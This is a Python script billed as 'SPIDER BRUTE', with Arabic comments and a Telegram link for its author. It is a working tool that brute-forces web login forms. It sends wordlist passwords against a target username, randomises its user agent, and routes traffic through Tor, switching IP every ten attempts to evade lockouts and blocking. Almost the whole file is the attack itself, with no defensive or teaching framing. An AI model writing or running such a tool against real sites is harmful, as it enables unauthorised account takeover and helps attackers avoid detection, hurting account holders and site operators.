import os
import sys
import time

# تثبيت تلقائي لجميع المكتبات
required_libs = [
    "socks", "requests", "stem", "colorama", "pyfiglet", "fake_useragent"
]

def install_and_import(lib_name):
    try:
        __import__(lib_name)
    except ImportError:
        print(f"[+] Installing missing library: {lib_name}")
        os.system(f"pip install {lib_name}")

for lib in required_libs:
    install_and_import(lib)

# استيراد بعد التثبيت
import socks
import socket
import requests
from stem import Signal
from stem.control import Controller
from fake_useragent import UserAgent
from colorama import Fore, Style, init
from pyfiglet import figlet_format

init(autoreset=True)

# مسح الشاشة
os.system("clear")

# شعار الأداة
print(Fore.RED + figlet_format("SPIDER BRUTE", font="slant"))
print(Fore.YELLOW + "Made by: " + Fore.CYAN + "⚡𝙏𝙞𝙢𝙤")
print(Fore.YELLOW + "Telegram: " + Fore.CYAN + "https://t.me/hacker16_thsb")
print("=" * 60)

# تشغيل Tor تلقائياً
print(Fore.GREEN + "[*] Launching Tor in background...")
os.system("tor &")
time.sleep(5)  # نعطيه وقت بش يتشغل

# إعداد Tor كبروكسي
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

# تغيير IP باستخدام Tor
def switch_tor_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password='tor_password')  # غيّر الباسورد إذا لازم
            controller.signal(Signal.NEWNYM)
            print(Fore.MAGENTA + "[~] Switched Tor IP")
    except Exception as e:
        print(Fore.RED + f"[!] Tor IP switch failed: {e}")

# مدخلات المستخدم
url = input(Fore.GREEN + "[?] Enter Login URL: ")
username = input(Fore.GREEN + "[?] Enter Target Username/Email: ")
wordlist_path = input(Fore.GREEN + "[?] Enter Wordlist Path: ")
max_attempts = int(input(Fore.GREEN + "[?] Max attempts: "))
delay = float(input(Fore.GREEN + "[?] Delay between attempts (in seconds): "))

# تحميل الباسووردات
try:
    with open(wordlist_path, "r") as file:
        passwords = [line.strip() for line in file.readlines()]
except FileNotFoundError:
    print(Fore.RED + "[!] Wordlist not found!")
    sys.exit()

# بدء الهجوم
print(Fore.YELLOW + f"[+] Starting HTTP brute force on {url} ...")
headers = {'User-Agent': UserAgent().random}
attempts = 0

for password in passwords:
    if attempts >= max_attempts:
        print(Fore.RED + "[!] Max attempts reached.")
        break
    try:
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data, headers=headers, timeout=10)
        print(Fore.BLUE + f"[*] Trying: {password}")
        if "incorrect" not in response.text.lower():  # عدل الرسالة حسب الاستجابة
            print(Fore.GREEN + f"[+] Password Found: {password}")
            break
        attempts += 1
        time.sleep(delay)
        if attempts % 10 == 0:
            switch_tor_ip()
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        continue

print(Fore.YELLOW + "[*] Done.")
